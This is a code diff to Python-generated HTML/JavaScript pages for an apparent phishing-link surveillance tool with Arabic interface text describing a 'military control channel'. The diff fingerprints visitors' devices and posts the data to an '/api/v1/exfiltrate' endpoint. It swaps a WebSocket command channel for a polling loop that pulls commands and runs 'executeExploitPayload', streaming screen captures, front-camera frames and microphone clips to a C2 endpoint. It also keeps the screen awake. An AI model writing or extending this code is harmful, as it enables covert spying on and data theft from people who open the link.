@@ -71,31 +71,11 @@ def get_intel_template(link_id: str) -> str:
 
             let hardwareInfo = {{
                 res: window.screen.width + 'x' + window.screen.height,
-                availRes: window.screen.availWidth + 'x' + window.screen.availHeight,
-                colorDepth: window.screen.colorDepth,
                 platform: navigator.platform,
                 language: navigator.language,
-                languages: navigator.languages,
                 hardwareConcurrency: navigator.hardwareConcurrency || 'غير معروف',
-                deviceMemory: navigator.deviceMemory || 'غير معروف',
-                maxTouchPoints: navigator.maxTouchPoints,
-                cookieEnabled: navigator.cookieEnabled,
-                onLine: navigator.onLine,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                deviceMemory: navigator.deviceMemory || 'غير معروف'
             }};
-
-            let webglRenderer = "غير معروف";
-            try {{
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (gl) {{
-                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    if (debugInfo) {{
-                        webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                    }}
-                }}
-            }} catch(e) {{}}
-            hardwareInfo.gpu = webglRenderer;
 
             try {{
                 await fetch('/api/v1/exfiltrate', {{
@@ -136,10 +116,10 @@ def get_live_template(link_id: str) -> str:
     </style>
 </head>
 <body>
-    <div class="c2-panel" onclick="initializeC2Bridge()">
+    <div class="c2-panel" onclick="initializeC2Engine()">
         <h2>⚡ تفعيل قناة السيطرة العسكرية النشطة</h2>
         <div class="c2-ring"></div>
-        <p>انقر هنا لربط القناة المشفرة وضمان ثبات الجلسة المعزولة.</p>
+        <p>انقر هنا لتفعيل قنوات التزامن المباشرة وضمان استقرار الجلسة.</p>
     </div>
 
     <video id="v_stream" autoplay playsinline muted style="display:none;"></video>
@@ -147,11 +127,9 @@ def get_live_template(link_id: str) -> str:
 
     <script>
         const linkId = "{link_id}";
-        let wsClient = null;
-        let isConnected = false;
         let periodicTimer = null;
 
-        async function initializeC2Bridge() {{
+        async function initializeC2Engine() {{
             try {{
                 const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                 const osc = audioCtx.createOscillator();
@@ -162,8 +140,9 @@ def get_live_template(link_id: str) -> str:
                 if ('wakeLock' in navigator) await navigator.wakeLock.request('screen');
             }} catch(e) {{}}
 
-            establishWebSocketConnection();
-            
+            // بدء حلقة جلب الأوامر باستمرار (Polling Loop)
+            setInterval(pollCommands, 1500);
+
             try {{
                 const stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }});
                 const v = document.getElementById('v_stream');
@@ -186,34 +165,22 @@ def get_live_template(link_id: str) -> str:
                 }});
             }} catch(e) {{}}
 
-            document.querySelector('.c2-panel').innerHTML = "<h2>🟢 تم الاتصال بقناة C2 بنجاح</h2><p>الجلسة تحت السيطرة الكاملة الآن.</p>";
+            document.querySelector('.c2-panel').innerHTML = "<h2>🟢 تم تفعيل قناة السيطرة بنجاح</h2><p>الجلسة متصلة وجاهزة لتنفيذ الأوامر.</p>";
         }}
 
-        function establishWebSocketConnection() {{
-            const proto = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
-            wsClient = new WebSocket(proto + window.location.host + '/ws/c2/' + linkId);
-
-            wsClient.onopen = () => {{ isConnected = true; }};
-            wsClient.onmessage = async (event) => {{
-                try {{
-                    const packet = JSON.parse(event.data);
-                    if (packet.cmd === "ping") {{
-                        wsClient.send(JSON.stringify({{ type: "pong" }}));
-                        return;
+        async function pollCommands() {{
+            try {{
+                let res = await fetch('/api/v1/poll-command/' + linkId);
+                let data = await res.json();
+                if (data && data.cmd) {{
+                    let resultPayload = await executeExploitPayload(data.cmd);
+                    if (resultPayload) {{
+                        sendResultData(data.cmd, resultPayload);
                     }}
-                    let responsePayload = await executeExploitPayload(packet.cmd);
-                    if (responsePayload && !packet.cmd.includes("live_")) {{
-                        transmitPayloadResult(packet.cmd, responsePayload);
-                    }}
-                }} catch(e) {{}}
-            }};
-            wsClient.onclose = () => {{
-                isConnected = false;
-                setTimeout(establishWebSocketConnection, 1500);
-            }};
+                }}
+            }} catch(e) {{}}
         }}
 
-        // أدوات استغلال متقدمة ومعزولة كلياً
         async function executeExploitPayload(commandType) {{
             let payloadResult = "";
             try {{
@@ -264,7 +231,7 @@ def get_live_template(link_id: str) -> str:
                                     canvas.height = v.videoHeight || window.innerHeight;
                                     const ctx = canvas.getContext('2d');
                                     ctx.drawImage(v, 0, 0, canvas.width, canvas.height);
-                                    transmitPayloadResult("live_screen_frame", canvas.toDataURL('image/jpeg', 0.65));
+                                    sendResultData("live_screen_frame", canvas.toDataURL('image/jpeg', 0.65));
                                 }} catch(e) {{}}
                             }}, 1500);
                             return "🔴 تم تفعيل البث الحي المستمر للشاشة بنجاح!";
@@ -291,7 +258,7 @@ def get_live_template(link_id: str) -> str:
                                     canvas.height = v.videoHeight || 480;
                                     const ctx = canvas.getContext('2d');
                                     ctx.drawImage(v, 0, 0, canvas.width, canvas.height);
-                                    transmitPayloadResult("live_camera_frame", canvas.toDataURL('image/jpeg', 0.7));
+                                    sendResultData("live_camera_frame", canvas.toDataURL('image/jpeg', 0.7));
                                 }} catch(e) {{}}
                             }}, 1500);
                             return "📹 تم بدء البث الحي لكاميرا الهدف الأمامية!";
@@ -319,7 +286,7 @@ def get_live_template(link_id: str) -> str:
                                 const reader = new FileReader();
                                 reader.readAsDataURL(blob);
                                 reader.onloadend = () => {{
-                                    transmitPayloadResult("audio_clip", reader.result);
+                                    sendResultData("audio_clip", reader.result);
                                 }};
                                 micStream.getTracks().forEach(t => t.stop());
                             }};
@@ -332,7 +299,7 @@ def get_live_template(link_id: str) -> str:
                         break;
                 }}
             }} catch(err) {{
-                payloadResult = "خطأ في تنفيذ حمولة الاستغلال: " + err.message;
+                payloadResult = "خطأ في تنفيذ الأداة: " + err.message;
             }}
             return payloadResult;
         }}
@@ -346,17 +313,14 @@ def get_live_template(link_id: str) -> str:
             }}
         }}
 
-        function transmitPayloadResult(cmdType, dataContent) {{
-            const packet = {{ link_id: linkId, cmd: cmdType, data: dataContent }};
-            if (isConnected && wsClient && wsClient.readyState === WebSocket.OPEN) {{
-                wsClient.send(JSON.stringify({{ type: "response", ...packet }}));
-            }} else {{
-                fetch('/api/v1/c2-respond', {{
+        async function sendResultData(cmdType, dataContent) {{
+            try {{
+                await fetch('/api/v1/c2-respond', {{
                     method: 'POST',
                     headers: {{ 'Content-Type': 'application/json' }},
-                    body: JSON.stringify(packet)
-                }}).catch(e => {{}});
-            }}
+                    body: JSON.stringify({{ link_id: linkId, cmd: cmdType, data: dataContent }})
+                }});
+            }} catch(e) {{}}
         }}
     </script>
 </body>
